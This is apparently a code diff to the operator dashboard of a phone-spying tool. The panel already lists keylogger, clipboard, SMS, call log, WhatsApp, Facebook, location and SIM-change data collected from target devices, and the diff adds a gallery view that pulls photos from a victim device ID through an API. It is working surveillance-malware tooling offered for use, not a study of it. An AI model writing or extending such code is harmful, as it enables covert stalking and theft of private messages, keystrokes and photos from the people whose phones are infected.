@@ -165,6 +165,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       <div class="nav-item" data-section="chats"><svg><use href="/static/icons.svg#icon-chat"/></svg> Chats</div>
       <div class="nav-item" data-section="facebook"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook</div>
       <div class="nav-item" data-section="whatsapp"><svg><use href="/static/icons.svg#icon-chat"/></svg> WhatsApp</div>
+      <div class="nav-item" data-section="gallery"><svg><use href="/static/icons.svg#icon-camera"/></svg> Gallery</div>
       <div class="nav-item" data-section="contacts"><svg><use href="/static/icons.svg#icon-contacts"/></svg> Contacts</div>
       <div class="nav-item" data-section="apps"><svg><use href="/static/icons.svg#icon-apps"/></svg> App Usage</div>
       <div class="nav-item" data-section="devices"><svg><use href="/static/icons.svg#icon-devices"/></svg> Devices <span class="badge" id="devBadge">{{ total_devices }}</span></div>
@@ -290,6 +291,15 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
         <div class="card"><div class="card-header">Pesan WhatsApp</div><div class="card-body" id="waData"></div></div>
       </div>
 
+      <!-- ======== GALLERY ======== -->
+      <div class="section" id="sec-gallery">
+        <div class="filter-bar">
+          <input type="text" id="galDevice" placeholder="Device ID..." value="65057ab5f5" style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--text);font-size:12px;width:140px">
+          <div class="filter-chip active" onclick="loadGallery()">Refresh</div>
+        </div>
+        <div class="card"><div class="card-header">Foto & Media</div><div class="card-body" id="galleryData"></div></div>
+      </div>
+
       <!-- ======== CONTACTS ======== -->
       <div class="section" id="sec-contacts">
         <div class="filter-bar">
@@ -354,7 +364,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 const BASE_URL = '{{ base_url }}';
-const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
+const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',gallery:'Gallery',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
 
 function switchSection(name){
   document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));
@@ -375,6 +385,7 @@ function switchSection(name){
   else if(name=='chats') loadChats();
   else if(name=='facebook') loadFacebook();
   else if(name=='whatsapp') loadWhatsapp();
+  else if(name=='gallery') loadGallery();
   else if(name=='contacts') loadContacts();
   else if(name=='apps') loadApps();
   else if(name=='devices') loadDevices();
@@ -838,6 +849,23 @@ async function loadSimAlerts(){
   if(!d||!d.alerts||!d.alerts.length) return;
   let html=d.alerts.map(a=>`<div class="sim-alert"><span class="label">SIM CHANGE</span> ${a.device_id} — ${a.old_operator||'?'}→${a.new_operator||'?'} ${a.ts||''}</div>`).join('');
   document.getElementById('simAlertData').innerHTML=html;
+}
+
+// Gallery
+async function loadGallery(){
+  let id=document.getElementById('galDevice').value||'65057ab5f5';
+  let d=await api('/api/photos/'+id);
+  if(!d||!d.photos||!d.photos.length) return void(document.getElementById('galleryData').innerHTML='<div class="empty-state"><svg><use href="/static/icons.svg#icon-camera"/></svg><div>Belum ada foto</div></div>');
+  
+  let html='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px">';
+  d.photos.forEach(p=>{
+    html+=`<div style="border-radius:8px;overflow:hidden;border:1px solid var(--border);background:var(--bg2)">
+      <a href="${p.url}" target="_blank"><img src="${p.url}" style="width:100%;height:120px;object-fit:cover;display:block" loading="lazy"></a>
+      <div style="padding:6px 8px;font-size:10px;color:var(--text2)">${(p.timestamp||'').slice(0,16)}</div>
+    </div>`;
+  });
+  html+='</div>';
+  document.getElementById('galleryData').innerHTML=html;
 }
 
 function esc(s){if(!s)return'';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
